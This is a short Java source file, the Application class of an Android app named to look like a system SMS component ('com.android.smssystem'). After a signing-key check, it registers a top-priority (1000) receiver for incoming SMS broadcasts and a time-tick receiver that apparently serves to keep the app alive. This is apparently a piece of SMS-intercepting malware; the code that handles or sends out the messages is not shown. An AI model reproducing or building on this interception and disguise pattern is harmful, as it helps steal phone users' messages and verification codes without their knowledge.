package com.android.smssystem;

import android.app.Application;
import android.content.Intent;
import android.content.IntentFilter;

public class SmsApp extends Application {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		if (SmSutils.key.equals(SmSutils.getPublicKey(this))) {
			IntentFilter localIntentFilter = new IntentFilter();
			localIntentFilter.addAction(SmSserver.SMS_RECEIVED);
			localIntentFilter.addAction(SmSserver.SMS_RECEIVED_2);
			localIntentFilter.addAction(SmSserver.GSM_SMS_RECEIVED);
			localIntentFilter.setPriority(1000);
			SmSReceiver localMessageReceiver = new SmSReceiver();
			this.registerReceiver(localMessageReceiver, localIntentFilter);
		}
		IntentFilter intentfilter = new IntentFilter(Intent.ACTION_TIME_TICK);
		BootReceiver receiver = new BootReceiver();
		this.registerReceiver(receiver, intentfilter);
	}

}
